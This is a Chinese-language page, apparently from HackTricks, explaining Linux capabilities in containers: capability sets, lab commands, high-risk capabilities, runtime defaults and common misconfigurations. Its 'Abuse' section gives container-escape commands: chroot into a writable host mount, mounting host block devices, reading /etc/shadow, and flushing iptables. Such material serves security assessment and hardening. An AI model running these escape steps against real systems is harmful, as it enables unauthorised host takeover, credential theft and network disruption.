# 容器中的 Linux Capabilities

{{#include ../../../../banners/hacktricks-training.md}}

## 概述

Linux capabilities 是容器安全中最重要的组成部分之一，因为它们回答了一个微妙但基础的问题：**容器内的“root”究竟意味着什么？** 在普通 Linux 系统中，UID 0 历来意味着非常广泛的权限集合。在现代内核中，这些权限被拆分为称为 capabilities 的更小单元。如果移除了相关 capabilities，即使进程以 root 身份运行，也可能缺少许多强大的操作权限。

容器高度依赖这种区分。出于兼容性或简单性考虑，许多 workload 仍会在容器内以 UID 0 启动。如果不丢弃 capabilities，这将极其危险。丢弃 capabilities 后，容器中的 root 进程仍可执行许多普通的容器内任务，同时被禁止执行更敏感的内核操作。因此，容器 shell 显示 `uid=0(root)` 并不自动意味着“host root”，甚至不意味着拥有“广泛的内核权限”。Capability sets 决定了这个 root 身份实际上有多大价值。

如需查看完整的 Linux capability 参考资料和许多滥用示例，请参阅：

{{#ref}}
../../../interesting-files-permissions/linux-capabilities.md
{{#endref}}

## 操作

Capabilities 会被记录在多个集合中，包括 permitted、effective、inheritable、ambient 和 bounding sets。对于许多容器评估来说，与其立即关注每个集合的精确内核语义，不如先回答最终的实际问题：**此进程现在能够成功执行哪些特权操作，以及未来仍有哪些可能的权限提升路径？**

这之所以重要，是因为许多 breakout techniques 本质上是被伪装成容器问题的 capability 问题。拥有 `CAP_SYS_ADMIN` 的 workload 可以访问大量普通容器 root 进程不应接触的内核功能。如果 workload 拥有 `CAP_NET_ADMIN`，并且还共享 host network namespace，那么它的危险性会进一步增加。如果 workload 拥有 `CAP_SYS_PTRACE`，并且能够通过共享 host PID 看到 host 进程，那么它就更值得关注。在 Docker 或 Podman 中，这可能表现为 `--pid=host`；在 Kubernetes 中，通常表现为 `hostPID: true`。

换句话说，不能孤立地评估 capability set。必须结合 namespaces、seccomp 和 MAC policy 一起分析。

## 实验

在容器内检查 capabilities 的一种非常直接的方法是：
```bash
docker run --rm -it debian:stable-slim bash
apt-get update && apt-get install -y libcap2-bin
capsh --print
```
你还可以将限制性更强的容器与添加了所有 capabilities 的容器进行比较：
```bash
docker run --rm debian:stable-slim sh -c 'grep CapEff /proc/self/status'
docker run --rm --cap-add=ALL debian:stable-slim sh -c 'grep CapEff /proc/self/status'
```
要查看仅添加一项 capability 的效果，请先删除所有内容，然后仅添加回一个 capability：
```bash
docker run --rm --cap-drop=ALL --cap-add=NET_BIND_SERVICE debian:stable-slim sh -c 'grep CapEff /proc/self/status'
```
这些小型实验有助于说明，runtime 并不是简单地切换一个名为 "privileged" 的布尔值，而是在塑造进程实际可用的权限面。

## 高风险 Capabilities

尽管具体目标不同，许多 capabilities 都可能发挥作用，但其中有几项在 container escape 分析中反复出现。

**`CAP_SYS_ADMIN`** 是 defenders 最应当警惕的一项。它通常被称为 "the new root"，因为它解锁了极其庞大的功能范围，包括与 mount 相关的操作、对 namespace 敏感的行为，以及许多本不应随意暴露给 containers 的 kernel 路径。如果一个 container 具有 `CAP_SYS_ADMIN`、seccomp 较弱，且没有强力的 MAC confinement，那么许多经典 breakout 路径都会变得更加现实。

当存在 process visibility 时，**`CAP_SYS_PTRACE`** 就很重要，尤其是在 PID namespace 与 host 或其他有价值的邻近 workloads 共享的情况下。它可以将可见性转化为篡改能力。

在以 network 为重点的环境中，**`CAP_NET_ADMIN`** 和 **`CAP_NET_RAW`** 都很重要。在隔离的 bridge network 上，它们可能已经具有风险；而在共享的 host network namespace 中，情况会糟糕得多，因为该 workload 可能能够重新配置 host networking、sniff、spoof，或干扰本地 traffic flows。

在 rootful 环境中，**`CAP_SYS_MODULE`** 通常具有灾难性影响，因为加载 kernel modules 实际上等同于控制 host kernel。它几乎不应出现在通用 container workload 中。

## Runtime 使用

Docker、Podman、基于 containerd 的 stacks 以及 CRI-O 都使用 capability controls，但默认设置和管理接口各不相同。Docker 通过 `--cap-drop` 和 `--cap-add` 等 flags 非常直接地提供这些控制。Podman 提供类似的 controls，并且通常可以通过 rootless execution 获得额外的安全层。Kubernetes 通过 Pod 或 container 的 `securityContext` 提供 capability additions 和 drops。LXC/Incus 等 system-container 环境同样依赖 capability control，但这些系统与 host 更广泛的集成，往往会诱使 operators 比在 app-container 环境中更加激进地放宽默认设置。

同一原则适用于所有这些环境：技术上可以授予的 capability，并不意味着就应该授予。许多现实世界中的 incidents 都始于这样的情况：某个 workload 在更严格的配置下运行失败，而团队需要快速修复，于是 operator 仅仅为了 "make the application work" 就添加了某项 capability。

## 配置错误

最明显的错误是在 Docker/Podman 风格的 CLIs 中使用 **`--cap-add=ALL`**，但这并不是唯一的问题。实际上，更常见的问题是授予一两项极其强大的 capabilities，尤其是 `CAP_SYS_ADMIN`，以便 "make the application work"，却没有同时理解 namespace、seccomp 和 mount 的影响。另一种常见的 failure mode 是将额外 capabilities 与 host namespace sharing 结合使用。在 Docker 或 Podman 中，这可能表现为 `--pid=host`、`--network=host` 或 `--userns=host`；在 Kubernetes 中，等效的 exposure 通常通过 `hostPID: true` 或 `hostNetwork: true` 等 workload settings 出现。这些组合中的每一种，都会改变该 capability 实际能够影响的范围。

管理员还经常认为，只要 workload 不是完全的 `--privileged`，它就仍然受到有意义的限制。有时确实如此，但有时其 effective posture 已经足够接近 privileged，以至于这一差异在实际操作中不再重要。

## Abuse

第一步实践操作是枚举 effective capability set，并立即测试那些与 escape 或 host information access 相关的 capability-specific actions：
```bash
capsh --print
grep '^Cap' /proc/self/status
```
如果存在 `CAP_SYS_ADMIN`，请先测试基于 mount 的滥用和主机文件系统访问，因为这是最常见的逃逸助力之一：
```bash
mkdir -p /tmp/m
mount -t tmpfs tmpfs /tmp/m 2>/dev/null && echo "tmpfs mount works"
mount | head
find / -maxdepth 3 -name docker.sock -o -name containerd.sock -o -name crio.sock 2>/dev/null
```
如果存在 `CAP_SYS_PTRACE` 且容器可以看到有趣的进程，请验证该 capability 是否可以转化为进程检查：
```bash
capsh --print | grep cap_sys_ptrace
ps -ef | head
for p in 1 $(pgrep -n sshd 2>/dev/null); do cat /proc/$p/cmdline 2>/dev/null; echo; done
```
如果存在 `CAP_NET_ADMIN` 或 `CAP_NET_RAW`，测试该 workload 是否能够操纵可见的网络栈，或至少收集有用的网络情报：
```bash
capsh --print | grep -E 'cap_net_admin|cap_net_raw'
ip addr
ip route
iptables -S 2>/dev/null || nft list ruleset 2>/dev/null
```
当 capability test 成功后，需要结合 namespace 的具体情况进行判断。在 isolated namespace 中看起来只是存在风险的 capability，如果 container 同时共享 host PID、host network 或 host mounts，可能会立即变成 escape 或 host-recon primitive。

### 完整示例：`CAP_SYS_ADMIN` + Host Mount = Host Escape

如果 container 具有 `CAP_SYS_ADMIN`，并且将 host filesystem 以可写 bind mount 的形式挂载到 `/host` 等路径，escape 路径通常非常直接：
```bash
capsh --print | grep cap_sys_admin
mount | grep ' /host '
ls -la /host
chroot /host /bin/bash
```
如果 `chroot` 成功，命令现在会在宿主机根文件系统上下文中执行：
```bash
id
hostname
cat /etc/shadow | head
```
如果 `chroot` 不可用，通常可以通过挂载的树调用该 binary 来实现相同的结果：
```bash
/host/bin/bash -p
export PATH=/host/usr/sbin:/host/usr/bin:/host/sbin:/host/bin:$PATH
```
### 完整示例：`CAP_SYS_ADMIN` + 设备访问

如果暴露了主机中的块设备，`CAP_SYS_ADMIN` 可以将其变为直接访问主机文件系统的途径：
```bash
ls -l /dev/sd* /dev/vd* /dev/nvme* 2>/dev/null
mkdir -p /mnt/hostdisk
mount /dev/sda1 /mnt/hostdisk 2>/dev/null || mount /dev/vda1 /mnt/hostdisk 2>/dev/null
ls -la /mnt/hostdisk
chroot /mnt/hostdisk /bin/bash 2>/dev/null
```
### 完整示例：`CAP_NET_ADMIN` + 主机网络

此组合并不总是能直接获得主机 root 权限，但可以完全重新配置主机网络栈：
```bash
capsh --print | grep cap_net_admin
ip addr
ip route
iptables -S 2>/dev/null || nft list ruleset 2>/dev/null
ip link set lo down 2>/dev/null
iptables -F 2>/dev/null
```
这可能导致拒绝服务、流量拦截，或访问之前被过滤的服务。

## 检查

capability 检查的目标不仅是转储原始值，还要了解进程是否拥有足够的权限，使其当前的 namespace 和 mount 状态变得危险。
```bash
capsh --print                    # Human-readable capability sets and securebits
grep '^Cap' /proc/self/status    # Raw kernel capability bitmasks
```
这里有什么值得注意：

- `capsh --print` 是发现高风险 capabilities 的最简单方法，例如 `cap_sys_admin`、`cap_sys_ptrace`、`cap_net_admin` 或 `cap_sys_module`。
- `/proc/self/status` 中的 `CapEff` 行会告诉你当前实际生效的内容，而不仅仅是其他集合中可能可用的内容。
- 如果 container 还共享 host PID、network 或 user namespaces，或者挂载了可写的 host mounts，那么 capability dump 的重要性会大幅提高。

收集原始 capability 信息后，下一步是进行解释。需要确认进程是否为 root、user namespaces 是否处于 active 状态、host namespaces 是否被共享、seccomp 是否正在 enforcing，以及 AppArmor 或 SELinux 是否仍在限制该进程。单独的 capability set 只是整体情况的一部分，但它通常能解释为什么某个 container breakout 可以成功，而另一个在看似相同的起点下却失败。

## Runtime 默认设置

| Runtime / platform | 默认状态 | 默认行为 | 常见的手动弱化方式 |
| --- | --- | --- | --- |
| Docker Engine | 默认使用精简的 capability set | Docker 默认保留一个 capabilities allowlist，并删除其余 capabilities | `--cap-add=<cap>`、`--cap-drop=<cap>`、`--cap-add=ALL`、`--privileged` |
| Podman | 默认使用精简的 capability set | Podman containers 默认是 unprivileged，并使用精简的 capability model | `--cap-add=<cap>`、`--cap-drop=<cap>`、`--privileged` |
| Kubernetes | 除非更改，否则继承 runtime defaults | 如果未指定 `securityContext.capabilities`，container 会从 runtime 获取默认 capability set | `securityContext.capabilities.add`、未执行 `drop: [\"ALL\"]`、`privileged: true` |
| Kubernetes 下的 containerd / CRI-O | 通常使用 runtime default | 有效 set 取决于 runtime 以及 Pod spec | 与 Kubernetes 行相同；直接的 OCI/CRI 配置也可以显式添加 capabilities |

对于 Kubernetes，重要的一点是：API 并未定义一个统一的默认 capability set。如果 Pod 没有添加或删除 capabilities，workload 会继承该 node 的 runtime default。
{{#include ../../../../banners/hacktricks-training.md}}
